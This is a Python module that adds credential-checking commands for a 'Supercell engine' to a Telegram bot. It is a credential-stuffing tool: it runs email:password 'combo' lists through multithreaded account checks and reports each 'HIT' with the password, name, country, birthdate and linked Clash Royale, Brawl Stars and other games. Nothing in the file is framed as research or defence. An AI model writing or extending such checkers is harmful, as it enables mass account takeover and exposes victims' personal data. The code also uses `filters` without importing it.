"""
Supercell Bot Integration Handler
Connects Supercell engine to the bot framework with full statistics tracking
"""

import json
import logging
from datetime import datetime
from typing import Dict, List, Optional, Any
from concurrent.futures import ThreadPoolExecutor
import threading
import queue

from bot_handlers import SupercellManager, handle_error

logger = logging.getLogger(__name__)


class SupercellBotIntegration:
    """Integrates Supercell engine with Telegram bot for command handling"""
    
    def __init__(self):
        self.manager = SupercellManager()
        self.active_sessions = {}  # Track active checking sessions
        self.result_lock = threading.Lock()
        self.results_file = "Supercell_Bot_Results.json"
    
    def is_enabled(self) -> bool:
        """Check if Supercell checking is available"""
        return self.manager.is_available()
    
    async def handle_supercell_check(self, update, context) -> str:
        """
        Handle /supercell_check command
        Usage: /supercell_check <combo_file> <threads>
        """
        try:
            if not self.is_enabled():
                return "❌ Supercell engine not available"
            
            args = context.args
            if len(args) < 1:
                return "❌ Usage: /supercell_check <combo_file> [threads]"
            
            combo_file = args[0]
            threads = int(args[1]) if len(args) > 1 else 50
            
            user_id = update.effective_user.id
            session_id = f"{user_id}_{datetime.now().timestamp()}"
            
            # Start session
            if not self.manager.start_session(session_id, combo_file):
                return "❌ Could not start checking session"
            
            # Store session
            self.active_sessions[session_id] = {
                "user_id": user_id,
                "combo_file": combo_file,
                "threads": threads,
                "started_at": datetime.now()
            }
            
            return (
                f"✅ **Supercell Checking Started**\n\n"
                f"📁 Combo File: `{combo_file}`\n"
                f"🧵 Threads: {threads}\n"
                f"📊 Session ID: `{session_id}`\n\n"
                f"Use `/supercell_stats {session_id}` to check progress"
            )
        
        except Exception as e:
            return handle_error(e, "Supercell check command", update.effective_user.id)
    
    async def handle_supercell_stats(self, update, context) -> str:
        """
        Handle /supercell_stats command
        Usage: /supercell_stats [session_id]
        """
        try:
            if not self.is_enabled():
                return "❌ Supercell engine not available"
            
            args = context.args
            
            if len(args) > 0:
                # Get stats for specific session
                session_id = args[0]
                stats = self.manager.get_session_stats(session_id)
                if not stats:
                    return "❌ Session not found or stats unavailable"
            else:
                # Get global stats
                stats = self.manager.get_global_stats()
            
            if not stats:
                return "❌ No statistics available"
            
            report = self.manager.format_stats_report(stats)
            return report
        
        except Exception as e:
            return handle_error(e, "Supercell stats command", update.effective_user.id)
    
    async def handle_supercell_single_check(self, update, context) -> str:
        """
        Handle /supercell_check_single command
        Check a single account directly
        Usage: /supercell_check_single <email>:<password>
        """
        try:
            if not self.is_enabled():
                return "❌ Supercell engine not available"
            
            args = context.args
            if len(args) < 1:
                return "❌ Usage: /supercell_check_single <email>:<password>"
            
            combo = args[0]
            if ':' not in combo:
                return "❌ Invalid format. Use: email:password"
            
            email, password = combo.split(':', 1)
            email = email.strip()
            password = password.strip()
            
            result = self.manager.check_account(email, password)
            
            if not result:
                return "❌ Checking failed"
            
            # Format result
            status = "✅ **SUPERCELL HIT!**" if result.get("status") == "supercell" else "📝 Valid Account"
            
            games = []
            if result.get("clash_royale"):
                games.append("🎮 Clash Royale")
            if result.get("brawl_stars"):
                games.append("⭐ Brawl Stars")
            if result.get("clash_of_clans"):
                games.append("🏰 Clash of Clans")
            if result.get("hay_day"):
                games.append("🌾 Hay Day")
            
            games_str = "\n".join(games) if games else "No games detected"
            
            report = (
                f"{status}\n\n"
                f"📧 Email: `{result.get('email')}`\n"
                f"🔑 Password: `{result.get('password')}`\n"
                f"👤 Name: {result.get('name', 'Unknown')}\n"
                f"🌍 Country: {result.get('country', 'Unknown')}\n"
                f"🎂 Birthdate: {result.get('birthdate', 'Unknown')}\n\n"
                f"📊 Statistics:\n"
                f"   • Total Messages: {result.get('total_messages', 0)}\n"
                f"   • Last Message: {result.get('last_message', 'Not Found')}\n\n"
                f"🎮 Linked Games:\n{games_str}"
            )
            
            return report
        
        except Exception as e:
            return handle_error(e, "Supercell single check", update.effective_user.id)
    
    def process_combo_file(self, combo_file: str, threads: int = 50, callback=None) -> Dict[str, Any]:
        """
        Process an entire combo file with multiple threads
        
        Args:
            combo_file: Path to combo file (email:password format)
            threads: Number of threads to use
            callback: Optional callback function for progress updates
        
        Returns:
            Dictionary with final statistics and results
        """
        try:
            if not self.is_enabled():
                return {"status": "error", "message": "Engine not available"}
            
            # Load combos
            combos = []
            try:
                with open(combo_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if ':' in line and line:
                            combos.append(tuple(line.split(':', 1)))
            except Exception as e:
                return {"status": "error", "message": f"Could not read file: {str(e)}"}
            
            if not combos:
                return {"status": "error", "message": "No valid combos found"}
            
            # Process with threads
            total = len(combos)
            checked = 0
            results = []
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = []
                
                for email, password in combos:
                    future = executor.submit(self.manager.check_account, email, password)
                    futures.append(future)
                
                for future in futures:
                    try:
                        result = future.result(timeout=30)
                        if result:
                            results.append(result)
                            if callback:
                                callback(result)
                    except Exception as e:
                        logger.error(f"Thread error: {e}")
                    finally:
                        checked += 1
            
            # Get final stats
            stats = self.manager.get_global_stats()
            
            return {
                "status": "completed",
                "total_processed": total,
                "results": results,
                "statistics": stats
            }
        
        except Exception as e:
            logger.error(f"Combo processing error: {e}")
            return {
                "status": "error",
                "message": str(e)
            }
    
    def get_results_summary(self) -> str:
        """Get a summary of all current results"""
        try:
            stats = self.manager.get_global_stats()
            if not stats:
                return "❌ No results yet"
            
            return self.manager.format_stats_report(stats)
        except Exception as e:
            return handle_error(e, "Getting results summary")
    
    def save_session_results(self, session_id: str) -> bool:
        """Save session results to file"""
        try:
            with self.result_lock:
                session = self.manager.sessions.get(session_id)
                if not session:
                    return False
                
                session_data = {
                    "session_id": session_id,
                    "combo_file": session.get("combo_file"),
                    "started_at": session.get("started_at"),
                    "ended_at": session.get("ended_at"),
                    "status": session.get("status"),
                    "initial_stats": session.get("initial_stats"),
                    "final_stats": session.get("final_stats")
                }
                
                with open(self.results_file, 'a', encoding='utf-8') as f:
                    f.write(json.dumps(session_data, indent=2) + "\n")
                
                return True
        except Exception as e:
            logger.error(f"Could not save results: {e}")
            return False


# Create global integration instance
supercell_integration = SupercellBotIntegration()


# ==================== COMMAND HANDLERS FOR BOT ====================

async def cmd_supercell_check(update, context):
    """Command: /supercell_check"""
    message = await supercell_integration.handle_supercell_check(update, context)
    await update.message.reply_text(message, parse_mode="Markdown")


async def cmd_supercell_stats(update, context):
    """Command: /supercell_stats"""
    message = await supercell_integration.handle_supercell_stats(update, context)
    await update.message.reply_text(message, parse_mode="Markdown")


async def cmd_supercell_single(update, context):
    """Command: /supercell_check_single"""
    message = await supercell_integration.handle_supercell_single_check(update, context)
    await update.message.reply_text(message, parse_mode="Markdown")


async def cmd_supercell_results(update, context):
    """Command: /supercell_results"""
    message = supercell_integration.get_results_summary()
    await update.message.reply_text(message, parse_mode="Markdown")


def get_supercell_handlers():
    """
    Get list of handlers for Supercell commands to add to bot application
    
    Usage in main bot file:
        from supercell_bot_integration import get_supercell_handlers
        app = Application.builder()...
        for handler in get_supercell_handlers():
            app.add_handler(handler)
    """
    from telegram.ext import CommandHandler
    
    return [
        CommandHandler("supercell_check", cmd_supercell_check, filters=filters.COMMAND),
        CommandHandler("supercell_stats", cmd_supercell_stats, filters=filters.COMMAND),
        CommandHandler("supercell_check_single", cmd_supercell_single, filters=filters.COMMAND),
        CommandHandler("supercell_results", cmd_supercell_results, filters=filters.COMMAND),
    ]


if __name__ == "__main__":
    # Test integration
    print("Supercell Bot Integration Module")
    print(f"Engine available: {supercell_integration.is_enabled()}")
    if supercell_integration.is_enabled():
        print("✅ Ready for use!")
    else:
        print("❌ Supercell engine not available")
